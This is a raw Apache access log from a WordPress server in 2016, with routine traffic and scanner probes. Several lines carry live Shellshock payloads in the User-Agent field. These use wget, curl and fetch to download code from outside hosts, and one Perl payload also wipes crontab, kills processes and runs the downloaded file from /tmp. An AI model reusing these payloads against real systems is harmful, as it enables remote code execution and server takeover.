198.20.87.98 - - [08/May/2016:04:44:07 +0000] "GET /robots.txt HTTP/1.1" 404 445 "-" "-"
198.20.87.98 - - [08/May/2016:04:44:07 +0000] "GET /sitemap.xml HTTP/1.1" 404 446 "-" "-"
123.59.59.52 - - [08/May/2016:04:51:22 +0000] "GET http://www.qunar.com/ HTTP/1.1" 301 312 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0"
123.59.59.52 - - [08/May/2016:04:51:22 +0000] "GET http://www.qunar.comhttp/www.qunar.com/ HTTP/1.1" 404 473 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0"
127.0.0.1 - - [08/May/2016:05:07:11 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
::1 - - [08/May/2016:06:44:04 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
164.132.231.221 - - [25/Apr/2016:12:49:40 +0000] "GET / HTTP/1.1" 200 5889 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
164.132.231.221 - - [25/Apr/2016:12:49:40 +0000] "GET /wp-content/plugins/var/www/html/wp-content/themes/nuntius/nuntius.css?ver=2012-06-18 HTTP/1.1" 404 560 "http://ec2-52-31-166-88.eu-west-1.compute.amazonaws.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
164.132.231.221 - - [25/Apr/2016:12:49:40 +0000] "GET /wp-content/themes/nuntius/style.css?ver=4.0.10 HTTP/1.1" 200 10269 "http://ec2-52-31-166-88.eu-west-1.compute.amazonaws.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
164.132.231.221 - - [25/Apr/2016:12:49:40 +0000] "GET /wp-includes/js/jquery/jquery.js?ver=1.11.1 HTTP/1.1" 200 33584 "http://ec2-52-31-166-88.eu-west-1.compute.amazonaws.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
164.132.231.221 - - [25/Apr/2016:12:49:40 +0000] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1 HTTP/1.1" 200 3419 "http://ec2-52-31-166-88.eu-west-1.compute.amazonaws.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
164.132.231.221 - - [25/Apr/2016:12:49:40 +0000] "GET /wp-content/themes/nuntius/js/jquery.cycle.all.js?ver=20130415 HTTP/1.1" 200 13899 "http://ec2-52-31-166-88.eu-west-1.compute.amazonaws.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
164.132.231.221 - - [25/Apr/2016:12:49:40 +0000] "GET /wp-includes/images/smilies/icon_wink.gif HTTP/1.1" 200 452 "http://ec2-52-31-166-88.eu-west-1.compute.amazonaws.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
164.132.231.221 - - [25/Apr/2016:12:49:41 +0000] "GET /wp-content/themes/nuntius/js/functions.js?ver=201101207 HTTP/1.1" 200 935 "http://ec2-52-31-166-88.eu-west-1.compute.amazonaws.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
164.132.231.221 - - [25/Apr/2016:12:49:41 +0000] "GET /wp-content/themes/nuntius/images/primary-menu-current.png HTTP/1.1" 200 393 "http://52.31.166.88/wp-content/themes/nuntius/style.css?ver=4.0.10" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
164.132.231.221 - - [25/Apr/2016:12:49:41 +0000] "GET /wp-content/themes/nuntius/images/breadcrumb-sep-ltr.png HTTP/1.1" 200 382 "http://52.31.166.88/wp-content/themes/nuntius/style.css?ver=4.0.10" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
164.132.231.221 - - [25/Apr/2016:12:49:41 +0000] "GET /wp-content/themes/nuntius/images/bg-container.png HTTP/1.1" 200 384 "http://52.31.166.88/wp-content/themes/nuntius/style.css?ver=4.0.10" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
164.132.231.221 - - [25/Apr/2016:12:49:41 +0000] "GET /wp-content/themes/nuntius/images/bg-sidebar-search-form.png HTTP/1.1" 200 523 "http://52.31.166.88/wp-content/themes/nuntius/style.css?ver=4.0.10" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
164.132.231.221 - - [25/Apr/2016:12:49:42 +0000] "GET /favicon.ico HTTP/1.1" 404 537 "http://ec2-52-31-166-88.eu-west-1.compute.amazonaws.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
52.31.166.88 - - [25/Apr/2016:12:49:40 +0000] "POST /wp-cron.php?doing_wp_cron=1461588580.1735570430755615234375 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
::1 - - [25/Apr/2016:12:49:49 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [25/Apr/2016:12:49:50 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
139.129.41.219 - - [25/Apr/2016:22:04:03 +0000] "GET http://ma.3g.qq.com/ HTTP/1.1" 301 310 "-" "Apache-HttpAsyncClient/4.1.1 (Java/1.8.0_91)"
52.31.166.88 - - [25/Apr/2016:22:04:03 +0000] "POST /wp-cron.php?doing_wp_cron=1461621843.0235500335693359375000 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
139.129.41.219 - - [25/Apr/2016:22:04:03 +0000] "GET http://ma.3g.qq.comhttp/ma.3g.qq.com/ HTTP/1.1" 404 471 "-" "Apache-HttpAsyncClient/4.1.1 (Java/1.8.0_91)"
89.248.174.4 - - [25/Apr/2016:22:28:15 +0000] "GET /xmlrpc.php HTTP/1.1" 200 212 "-" "-"
89.163.252.7 - - [26/Apr/2016:02:40:24 +0000] "CONNECT 8.8.8.8:53 HTTP/1.0" 200 15577 "-" "-"
52.31.166.88 - - [26/Apr/2016:02:40:24 +0000] "POST /wp-cron.php?doing_wp_cron=1461638424.5453190803527832031250 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
127.0.0.1 - - [26/Apr/2016:03:18:01 +0000] "GET / HTTP/1.1" 200 5889 "-" "Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0"
185.25.151.159 - - [26/Apr/2016:04:15:48 +0000] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [26/Apr/2016:05:51:27 +0000] "GET / HTTP/1.1" 200 5889 "-" "Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0"
52.31.166.88 - - [26/Apr/2016:05:51:27 +0000] "POST /wp-cron.php?doing_wp_cron=1461649887.8440649509429931640625 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
54.197.155.3 - - [26/Apr/2016:10:18:36 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)"
52.31.166.88 - - [26/Apr/2016:10:18:36 +0000] "POST /wp-cron.php?doing_wp_cron=1461665916.1520059108734130859375 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
141.212.122.161 - - [26/Apr/2016:10:25:01 +0000] "GET / HTTP/1.1" 301 274 "-" "Go http package"
141.212.122.161 - - [26/Apr/2016:10:25:01 +0000] "GET / HTTP/1.1" 200 5833 "http://52.31.166.88:80" "Go http package"
185.103.252.170 - - [26/Apr/2016:14:42:21 +0000] "GET /feed/ HTTP/1.1" 404 440 "-" "-"
91.196.50.33 - - [26/Apr/2016:15:14:27 +0000] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
80.82.78.38 - - [26/Apr/2016:21:00:04 +0000] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 459 "-" "Mozilla"
89.163.252.7 - - [27/Apr/2016:09:58:51 +0000] "GET http://iedb.ir HTTP/1.1" 301 300 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4"
89.163.252.7 - - [27/Apr/2016:09:58:51 +0000] "GET http://iedb.irhttp/iedb.ir/ HTTP/1.1" 404 461 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4"
52.31.166.88 - - [27/Apr/2016:09:58:51 +0000] "POST /wp-cron.php?doing_wp_cron=1461751131.6358819007873535156250 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
222.85.138.75 - coolmoon1202 [27/Apr/2016:11:46:45 +0000] "HEAD http://www.sina.com.cn HTTP/1.1" 301 278 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
222.85.138.75 - - [27/Apr/2016:11:46:46 +0000] "HEAD http://www.sina.com.cnhttp/www.sina.com.cn/ HTTP/1.1" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
89.163.252.7 - - [27/Apr/2016:14:53:00 +0000] "GET http://iedb.ir HTTP/1.1" 301 300 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4"
89.163.252.7 - - [27/Apr/2016:14:53:01 +0000] "GET http://iedb.irhttp/iedb.ir/ HTTP/1.1" 404 461 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4"
52.31.166.88 - - [27/Apr/2016:14:53:00 +0000] "POST /wp-cron.php?doing_wp_cron=1461768780.9636919498443603515625 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
89.163.252.7 - - [27/Apr/2016:20:01:12 +0000] "GET http://iedb.ir HTTP/1.1" 301 300 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4"
89.163.252.7 - - [27/Apr/2016:20:01:12 +0000] "GET http://iedb.irhttp/iedb.ir/ HTTP/1.1" 404 461 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4"
185.93.185.252 - - [27/Apr/2016:22:46:34 +0000] "GET / HTTP/1.1" 200 15625 "-" "Research scan, mail networkresearch@yandex.ru"
93.190.69.10 - - [27/Apr/2016:22:57:17 +0000] "GET / HTTP/1.1" 200 15625 "-" "() { :; }; /bin/sh -c 'wget http://closettransfer.com/FLUFFYPUPPY -O /dev/null;wget1 http://closettransfer.com/FLUFFYPUPPY -O /dev/null;curl http://closettransfer.com/FLUFFYPUPPY -o /dev/null;/usr/sfwbin/wget http://closettransfer.com/FLUFFYPUPPY;fetch -/dev/null http://closettransfer.com/FLUFFYPUPPY'"
89.163.252.7 - - [28/Apr/2016:01:29:41 +0000] "GET http://iedb.ir HTTP/1.1" 301 300 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4"
89.163.252.7 - - [28/Apr/2016:01:29:41 +0000] "GET http://iedb.irhttp/iedb.ir/ HTTP/1.1" 404 461 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4"
52.31.166.88 - - [28/Apr/2016:01:29:41 +0000] "POST /wp-cron.php?doing_wp_cron=1461806981.6023008823394775390625 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
42.159.144.101 - - [28/Apr/2016:05:32:57 +0000] "GET http://g-ecx.images-amazon.com/images/G/01/x-locale/common/transparent-pixel._CB386942464_.gif HTTP/1.0" 404 528 "-" "-"
127.0.0.1 - - [28/Apr/2016:05:51:04 +0000] "GET / HTTP/1.1" 200 5889 "-" "Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0"
127.0.0.1 - - [28/Apr/2016:07:51:27 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [28/Apr/2016:07:51:59 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [28/Apr/2016:08:09:08 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [28/Apr/2016:08:19:50 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [28/Apr/2016:08:32:05 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [28/Apr/2016:08:48:49 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [28/Apr/2016:11:20:23 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [28/Apr/2016:12:06:35 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [28/Apr/2016:13:06:35 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [28/Apr/2016:13:06:35 +0000] "POST /wp-cron.php?doing_wp_cron=1461848795.7280590534210205078125 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
52.31.166.88 - - [28/Apr/2016:14:06:36 +0000] "POST /wp-cron.php?doing_wp_cron=1461852396.8627080917358398437500 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
127.0.0.1 - - [28/Apr/2016:14:06:36 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [28/Apr/2016:15:06:37 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [28/Apr/2016:17:06:32 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
180.97.106.37 - - [28/Apr/2016:18:04:03 +0000] "GET http://www.baidu.com/robots.txt HTTP/1.1" 404 446 "-" "-"
185.25.151.159 - - [28/Apr/2016:20:14:18 +0000] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
185.25.151.159 - - [29/Apr/2016:01:23:00 +0000] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [29/Apr/2016:02:58:54 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
52.31.166.88 - - [29/Apr/2016:02:58:54 +0000] "POST /wp-cron.php?doing_wp_cron=1461898734.6366391181945800781250 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
127.0.0.1 - - [29/Apr/2016:03:06:31 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [29/Apr/2016:03:19:23 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
195.211.160.61 - - [29/Apr/2016:04:50:53 +0000] "GET / HTTP/1.1" 200 15625 "-" "() { :; }; /bin/sh -c 'wget http://closettransfer.com/IPTRANSITTEST -O /dev/null;wget1 http://closettransfer.com/IPTRANSITTEST -O /dev/null;curl http://closettransfer.com/IPTRANSITTEST -o /dev/null;/usr/sfwbin/wget http://closettransfer.com/IPTRANSITTEST;fetch -/dev/null http://closettransfer.com/IPTRANSITTEST'"
127.0.0.1 - - [29/Apr/2016:05:06:40 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
64.16.209.152 - - [29/Apr/2016:05:44:18 +0000] "GET /admin HTTP/1.0" 404 489 "-" "-"
127.0.0.1 - - [29/Apr/2016:06:06:33 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
127.0.0.1 - - [29/Apr/2016:06:26:03 +0000] "-" 408 0 "-" "-"
31.184.195.114 - - [29/Apr/2016:06:31:22 +0000] "GET HTTP/1.1 HTTP/1.1" 400 484 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:22 +0000] "GET /cgi-bin/cgi_wrapper/cgi_wrapper HTTP/1.1" 404 485 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:22 +0000] "GET /cgi-bin/feed.cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:22 +0000] "GET /cgi-bin/GetOrgFile HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:22 +0000] "GET /cgi-bin/nofile.sh HTTP/1.1" 404 471 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:22 +0000] "GET /cgi-bin/php HTTP/1.1" 404 465 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:22 +0000] "GET /cgi-bin/php4 HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:22 +0000] "GET /cgi-bin/php5 HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:23 +0000] "GET /cgi-bin/php5-cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:23 +0000] "GET /cgi-bin/php5.cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:24 +0000] "GET /cgi-bin/php5-cgi/test-cgi HTTP/1.1" 404 479 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:24 +0000] "GET /cgi-bin/php5-cgi/test.cgi HTTP/1.1" 404 479 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:24 +0000] "GET /cgi-bin/php5-cli HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:24 +0000] "GET /cgi-bin/php-cgi HTTP/1.1" 404 469 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:24 +0000] "GET /cgi-bin/php.cgi HTTP/1.1" 404 469 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:24 +0000] "GET /cgi-bin/rss.cgi HTTP/1.1" 404 469 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:24 +0000] "GET /cgi-bin/test-cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
